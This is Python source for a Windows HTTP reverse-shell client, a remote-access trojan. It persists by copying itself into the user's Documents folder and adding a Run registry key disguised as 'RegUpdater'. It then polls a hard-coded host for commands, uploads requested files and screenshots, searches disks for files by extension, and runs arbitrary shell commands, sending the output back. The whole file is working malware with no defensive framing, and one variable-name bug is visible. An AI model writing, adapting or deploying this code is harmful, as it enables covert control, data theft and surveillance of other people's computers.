import requests
import subprocess
import os
import time
import shutil, tempfile
import _winreg as wreg

from PIL import ImageGrab

currentDir = os.getcwd().strip('/n')

Null, usrProf = subprocess.check_output('set USERPROFILE', shell=True).split('=')

destDir = usrProf.strip('\n\r') + '\\Documents\\' +'http_reverse_shell_cleint.exe'


if not os.path.exists(destDir):

    shutil.copyfile(currentDir+'\http_reverse_shell_cleint.exe', destDir)

    Key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)

    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destDir)

    key.Close()

while True:

    getRequest = requests.get('http://10.110.151.46')
    cmd = getRequest.text


    if 'terminate' in cmd:
        break

    elif 'transfer' in cmd:

        trns, path = cmd.split('*')

        if os.path.exists(path):

            url = 'http://10.110.151.46/PickFile'
            files = {'file': open(path, 'rb')}
            myRequest = requests.post(url, files=files)

        else:
                myResponse = requests.post(url = 'http://10.110.151.46',data='File Not Found!')   


    elif 'CaptureScreen' in cmd:

        temDir = tempfile.mkdtemp()

        ImageGrab.grab().save(temDir + "\myImg.jpg", "JPEG")

        url = 'http://10.110.151.46/PickFile'
        files = {'file': open(temDir + "\myImg.jpg", 'rb')}
        myRequest = requests.post(url, files=files)
        files['file'].close()
        shutil.rmtree(temDir)
        

    elif 'Search' in cmd:

        cmd = cmd[7:]

        myPath, myExt = cmd.split('*')

        list = ''

        for dirpath, dirname, files in os.walk(myPath):
            for file in files:
                if file.endswith(myExt):
                    list = list + '\n' + os.path.join(dirpath, file)
        myRequest = requests.post(url='http://10.110.151.46', data=list)
        
       
    else:
        command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        postResult = requests.post(url='http://10.110.151.46', data=command.stdout.read())
        postError = requests.post (url='http://10.110.151.46', data=command.stderr.read())


        time.sleep(5)
        
